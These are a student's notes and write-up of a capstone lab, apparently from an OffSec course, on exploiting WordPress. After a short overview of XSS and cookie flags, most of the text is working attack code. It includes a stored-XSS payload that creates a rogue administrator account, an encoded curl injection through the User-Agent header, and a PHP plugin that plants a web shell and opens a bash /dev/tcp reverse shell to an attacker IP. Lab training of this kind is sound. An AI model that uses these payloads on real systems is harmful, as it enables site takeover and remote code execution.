[_Cross-Site Scripting_](https://owasp.org/www-community/attacks/xss/) (XSS)is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

One of the most important features of a well-defended web application is [_data sanitization_](https://en.wikipedia.org/wiki/Data_validation), a process in which user input is processed so that all dangerous characters or strings are removed or transformed. Unsanitized data allows an attacker to inject, and potentially execute, malicious code.

- Stored XSS attacks_, also known as _Persistent XSS_, occur when the exploit payload is stored in a database or otherwise cached by a server.
	- often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later.
- _Reflected XSS attacks_ usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link.
	- can often occur in search fields and results
- DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed

The [Secure](https://en.wikipedia.org/wiki/Secure_cookie) flag(cookie) instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

The [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

---


**Commonly Used URL Encodings**

| **Character**    | **URL Encoded** | **Character** | **URL Encoded** |
| ---------------- | --------------- | ------------- | --------------- |
| Space            | %20             | :             | %3A             |
| " (double quote) | %22             | ;             | %3B             |
| #                | %23             | <             | %3C             |
| $                | %24             | =             | %3D             |
| %                | %25             | >             | %3E             |
| &                | %26             | ?             | %3F             |
| ' (single quote) | %27             | @             | %40             |
| (                | %28             | [             | %5B             |
| )                | %29             | \|%5C         |                 |
| *                | %2A             | ]             | %5D             |
| +                | %2B             | ^             | %5E             |
| ,                | %2C             | {             | %7B             |
| /                | %2F             | `             | `               |
| ?                | %3F             | }             | %7D             |
| @                | %40             | ~             | %7E             |
| .                | %2E             |               |                 |
https://www.w3schools.com/tags/ref_urlencode.asp. ^^

example:
```
<script>alert(1)</script>
would be
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

  
CapStone:

3. **Capstone Lab**: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system. Upgrade the web shell to a full reverse shell and obtain the flag located in **/tmp/**. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.

#### Step 1, add new admin user:

I Open dev tools, notice all cookies are HTTP-Only so we need to find another attack vector

we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes

To develop this attack, we'll build a similar scenario as depicted by [Shift8](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/). First, we'll create a JS function that fetches the WordPress admin [_nonce_](https://developer.wordpress.org/reference/functions/wp_nonce_field/).
	 - The nonce field is used to validate that the contents of the form came from the location on the current site and not somewhere else. The nonce does not offer absolute protection, but should protect against most cases. It is very important to use nonce field in forms.

As mentioned, to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

This function performs a new HTTP request towards the **/wp-admin/user-new.php** URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

Now that we have nonce, we can use the function below to create a new admin user once the admin goes to the page where the imbedded code is:
```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Combine the two scripts above and then compress **
To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it. https://jscompress.com/

 we are going to encode the minified JavaScript code, so any bad characters won't interfere with sending the payload. We can do this using the following function:

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
convert each character into the corresponding UTF-16 integer code using the [_charCodeAt_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt) method

We are going to decode and execute the encoded string by first decoding the string with the [_fromCharCode_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode) method, then running it via the [_eval()_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) method. Once we have copied the encoded string, we can insert it with the following **curl** command and launch the attack:

```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

next start burp and put intercept on and verify the encoded script is in user-agent header, and forward.

Now we wait for the real admin to go to the page where the script is store, this will create a new admin with our credentials provided and we now have admin access to do whatever, v cool!

note the credentials are username: attacker, email: attacker@offsec.com, password: attackpass

#### Step 2, craft wordpress plugin:
I am able to read php but writing it is different story, I asked chatgpt to create me a php file that will reverse the webshell back to me on port 9001:

```
<?php
/**
 * Plugin Name: Malicious Shell
 * Plugin URI: http://attacker.com/
 * Description: A simple plugin to create a web shell and a reverse shell.
 * Version: 1.0
 * Author: Attacker
 * Author URI: http://attacker.com/
 */

function create_webshell() {
    $shell_code = '<?php
    if(isset($_GET["cmd"])) {
        echo "<pre>";
        system($_GET["cmd"]);
        echo "</pre>";
    }
    ?>';

    file_put_contents(WP_CONTENT_DIR . "/uploads/shell.php", $shell_code);
}

function reverse_shell() {
    $ip = "192.168.45.230"; // Change to YOUR Kali IP
    $port = 9001;           // Change to YOUR Listening Port

    $reverse_shell = '/bin/bash -c "bash -i >& /dev/tcp/' . $ip . '/' . $port . ' 0>&1"';
    shell_exec($reverse_shell);
}

// Create Web Shell
register_activation_hook(__FILE__, 'create_webshell');

// Execute Reverse Shell
register_activation_hook(__FILE__, 'reverse_shell');
?>
```

I edit the holly dolly plugin to the above, since we are admin in wordpress we can do this:

#### Step 3, get tmp flag

next i will run netcat listener on port 9001(same port in php file we edited):
```
nc -lvnp 9001
```

now that we are set i just activate the plugin and bang i got the reverse shell and i just cd back to / and went into tmp and found flag.txt

:D

